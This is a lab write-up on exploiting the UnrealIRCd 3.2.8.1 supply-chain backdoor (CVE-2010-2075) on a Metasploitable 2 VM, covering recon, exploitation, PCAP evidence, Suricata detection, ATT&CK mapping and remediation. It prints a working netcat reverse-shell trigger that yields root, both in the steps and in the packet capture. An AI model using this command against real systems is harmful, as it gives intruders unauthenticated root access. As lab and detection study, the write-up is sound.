# Port 6667 — UnrealIRCd 3.2.8.1 Backdoor (CVE-2010-2075)

## Target
- Host: Metasploitable 2 (192.168.75.130)
- Port: 6667/tcp
- Service: UnrealIRCd 3.2.8.1
- CVE: CVE-2010-2075

## Vulnerability Class
Supply-chain compromise. The official UnrealIRCd 3.2.8.1 source tarball was
silently replaced on the project's own mirrors between November 2009 and June
2010 with a trojanized version containing a modified unrealircd.c. This is not
a misconfiguration or memory corruption bug — it is backdoored source code
shipped from a trusted distribution point. The fix was checksum verification,
not patching.

## Backdoor Mechanism
The modified code intercepts any incoming line on port 6667 beginning with
the two-byte sequence "AB;" before the normal IRC protocol parser runs. The
remainder of the line is passed directly to system() on the server. No
authentication, no IRC registration, no prior session state required.

Key property: execution is blind. system() runs on the server's own
stdout/stderr — no output is returned across the TCP connection to the
attacker. Impact can only be proven via a callback (reverse shell).

## Exploitation Steps

### 1. Recon
```bash
nmap -sV -p 6667 192.168.75.130
```
Confirms UnrealIRCd on port 6667.

### 2. Listener (Kali)
```bash
nc -lvnp 4444
```

### 3. Trigger backdoor
```bash
echo -e 'AB;nc -e /bin/sh 192.168.75.129 4444' | nc 192.168.75.130 6667
```

### 4. Result
connect to [192.168.75.129] from (UNKNOWN) [192.168.75.130] 59488

id

uid=0(root) gid=0(root)

hostname

metasploitable

Root shell. No privilege escalation required — ircd was running as root,
meaning a service misconfiguration (excessive privilege) compounded the
supply-chain backdoor into an immediate full compromise.

## PCAP Evidence
Payload captured on eth0 (192.168.75.129 → 192.168.75.130:6667):
AB;nc -e /bin/sh 192.168.75.129 4444
Payload sits at offset 0 of the TCP stream — confirming the backdoor
intercepts before any IRC protocol parsing occurs.

## Detection Analysis

### Why standard host monitoring fails
No artifact is written to any log file on the target:
- No auth.log entry (no login, no PAM event)
- No sshd/login process
- No new file created
- Wazuh agentless mode (auth.log diffing) has zero visibility

The backdoor executes inside the ircd process via system(). The only
evidence that exists is on the wire.

### Detection layer required
Network packet inspection (NIDS) against port 6667 payload bytes.
A Suricata rule matching content:"AB;" at offset 0, depth 3 on established
TCP flows to port 6667 produces an eve.json alert that Wazuh can ingest.

Sigma rule: see sigma/unrealircd-backdoor.yml

## ATT&CK Mapping
| Technique | ID |
|---|---|
| Exploit Public-Facing Application | T1190 |
| Supply Chain Compromise | T1195 |
| Unix Shell | T1059.004 |

## Remediation
- Replace UnrealIRCd with a verified clean build (checksum-validated)
- Run IRC daemon as a dedicated low-privilege service account, not root
- Deploy NIDS (Suricata) with content inspection on IRC ports
- Verify source integrity of all compiled software via GPG/checksum